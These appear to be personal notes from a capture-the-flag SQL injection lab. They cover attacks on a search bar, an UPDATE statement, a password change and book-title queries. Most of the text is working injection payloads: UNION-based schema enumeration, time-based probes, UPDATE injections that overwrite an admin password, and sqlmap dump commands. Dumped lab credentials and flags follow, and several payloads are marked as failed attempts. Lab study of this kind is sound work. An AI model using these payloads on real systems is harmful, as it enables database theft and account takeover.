- search bar
- update statement
-  change password
-  book title "union"
-  


### search bar

search for true item

search for wildcards

construct query

```sql
select ? from ? where ? like '%hammer%';

get db type

select ? from ? where ? like '%';-- %';

select ? from ? where ? like '%hammer' AND 1 = sleep(2);-- %';

select ?,?,? from ? where ? like '%hammer' union (select 1,2,3 from dual);-- %';

select ?,?,? from ? where ? like '%hammer' union (select TABLE_NAME, TABLE_SCHEMA, 3 FROM infromation_schema.tables);--

select ?,?,? from ? where ? like '%hammer' union (select column_name,2,3 from information_schema.columns where table_name = 'users');--

select ?,?,? from ? where ? like '%hammer' union (select uLogin, uHash, uType from users);--

```


### Update statement

```sql
UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>
```

# MySQL and MSSQL

',nickName=@@version,email='

# For Oracle

',nickName=(SELECT banner FROM v$version),email='

# For SQLite

',nickName=sqlite_version(),email='


```sql
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```

We can then continue by extract all the column names from the usertable:

```sql
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
```

The subquery is using the group_concat() function to dump all the information simultaneously, and the || operator is "concatenate" - it joins together the strings of its operands (sqlite.org).

```sql
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
```

We can then update the password for the Admin user with the following code:

```
', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -

sqlmap -u http://10.10.230.205:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
```

Vulnerable notes

create a user with the query
	
```	

' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''

'  union select 1,group_concat(password) from users'

sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" --second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
```

`THM{4644c7e157fd5498e7e4026c89650814}`

### Change Password

create new user admin' -- -:a

login, then change password :b

logout and log back in with admin:b

done,

`THM{cd5c4f197d708fda06979f13d8081013}`

### book title

SELECT * from books WHERE id = (SELECT id FROM books WHERE title like 'harr%')

```sql

') union select 1,2,3,4 from sqlite_master-- -


') union select 1,sqlite_version,3,4 from sqlite_master-- -

3.22.0


SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

') SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -   didn't work


') union select 1,tbl_name,3,4 from sqlite_master-- -


Title: books
3
Author: 4
Title: notes
3
Author: 4
Title: users
3
Author: 4


') UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -  DIDNT WORK


') union select 1,sql,3,4 from users-- -

sqlite3_column_name()

') union select 1,sqlite3_column_name(),3,4 from users-- -


tbl_name column


', title=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users')-- - 




') union select 1,sql,3,4 from sqlite_master where name ='users'-- -


Title: CREATE TABLE users ( id integer primary key, username text unique not null, password text not null )
3
Author: 4


') union select 1,username,password,4 from users-- -


Title: admin

THM{27f8f7ce3c05ca8d6553bc5948a89210}

Author: 4
Title: amanda

Summer2019!

Author: 4
Title: dev

asd

Author: 4
Title: emil

viking123

Author: 4
Title: maja

345m3io4hj3

Author: 4
Title: student

password

Author: 4
```

### Book 2

Query 1:

```sql
SELECT id FROM books WHERE title like '' union select sqlite_version()-- -%'
```

Query 2:

```sql
SELECT * FROM books WHERE id = '3.22.0'
```

```
'union select tbl_name from sqlite_master-- -
```

shows the table books

```
'union select tbl_name,tbl_name from sqlite_master-- -	 nothing
```

```
' union select sql from sqlite_master where name ='books'-- -
```

Query 1:

```sql
SELECT id FROM books WHERE title like '' union select sql from sqlite_master where name ='books'-- -%'
```

Query 2:

```sql
SELECT * FROM books WHERE id = 'CREATE TABLE books (
    id integer primary key,
    title text not null,
    description text not null,
    author text not null
)'
```

```
' union select 1,2,3,4 from books-- - nothing
```

```
' union select 1,tbl_name from sqlite_master-- -
```

```
' union select '-1''union select 1,tbl_name,3,4 from sqlite_master-- -
```


```
Title: books

3

Author: 4
Title: notes

3

Author: 4
Title: users

3

Author: 4
```


' union select '-1''

' union select '-1'' union select 1,sql,3,4 from sqlite_master where name = 'users'-- -

') union select 1,sql,3,4 from sqlite_master where name ='users'-- -



' union select '-1'' union select 1,username,password,4 from users-- -
